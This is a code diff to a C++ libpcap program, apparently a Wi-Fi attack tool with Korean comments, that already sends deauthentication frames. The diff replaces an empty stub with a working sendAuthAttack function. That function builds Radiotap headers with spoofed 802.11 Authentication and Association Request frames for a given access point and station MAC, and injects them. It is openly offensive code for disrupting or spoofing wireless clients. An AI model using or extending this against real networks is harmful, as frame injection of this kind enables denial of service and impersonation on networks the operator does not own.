@@ -7,8 +7,10 @@
 #include <pcap.h>
 
 #include "mac.h"
-#include "deauth_packet.h"
 #include "radiotap.h"
+#include "deauth_packet.h"
+#include "auth_packet.h"
+#include "assoc_req_packet.h"
 
 using namespace std;
 
@@ -40,9 +42,43 @@ void sendDeauthPacket(pcap_t *handle, const Mac &ap_mac, const Mac &st_mac)
         cerr << "Error sending the packet: " << pcap_geterr(handle) << endl;
     }
 }
-void sendAuthPacket(pcap_t *handle, const string &iface, const Mac &ap_mac, const Mac &st_mac)
+
+void sendAuthAttack(pcap_t *handle, const Mac &ap_mac, const Mac &station_mac)
 {
-    return;
+    // 1. Radiotap 헤더
+    RadiotapHeader rt;
+    auto rtBytes = rt.toBytes();
+
+    // 2. Authentication Packet
+    AuthPacket authPkt(ap_mac, station_mac);
+    auto authBytes = authPkt.toBytes();
+
+    // 3. Association Request Packet
+    AssocRequestPacket assocPkt(ap_mac, station_mac);
+    auto assocBytes = assocPkt.toBytes();
+
+    // (예시) Auth -> Assoc 순서로 전송
+    // 4-1) Auth
+    {
+        std::vector<uint8_t> fullAuth(rtBytes);
+        fullAuth.insert(fullAuth.end(), authBytes.begin(), authBytes.end());
+
+        if (pcap_sendpacket(handle, fullAuth.data(), fullAuth.size()) != 0)
+        {
+            std::cerr << "[!] Error sending Auth Packet: " << pcap_geterr(handle) << std::endl;
+        }
+    }
+
+    // 4-2) Assoc
+    {
+        std::vector<uint8_t> fullAssoc(rtBytes);
+        fullAssoc.insert(fullAssoc.end(), assocBytes.begin(), assocBytes.end());
+
+        if (pcap_sendpacket(handle, fullAssoc.data(), fullAssoc.size()) != 0)
+        {
+            std::cerr << "[!] Error sending Assoc Packet: " << pcap_geterr(handle) << std::endl;
+        }
+    }
 }
 
 int main(int argc, char *argv[])
@@ -139,7 +175,7 @@ int main(int argc, char *argv[])
         {
             // auth 패킷 전송
             cout << "Send auth packet" << endl;
-            sendAuthPacket(handle, iface, ap_mac, st_mac);
+            sendAuthAttack(handle, ap_mac, st_mac);
         }
         else
         {
